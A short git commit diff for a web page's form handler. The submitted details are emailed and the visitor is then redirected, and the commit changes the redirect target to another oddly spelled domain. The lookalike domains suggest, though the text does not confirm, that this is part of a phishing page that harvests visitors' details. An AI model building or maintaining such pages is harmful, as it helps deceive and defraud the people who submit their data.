40a030d2b10282b0f39b310942d21d3b1f974b98
husknet <127146284+husknet@users.noreply.github.com>
2024-10-21 08:25:16 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.caradonnacontractlng.com';
+        window.location.href = 'https://sg.alltrack-cokflies.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
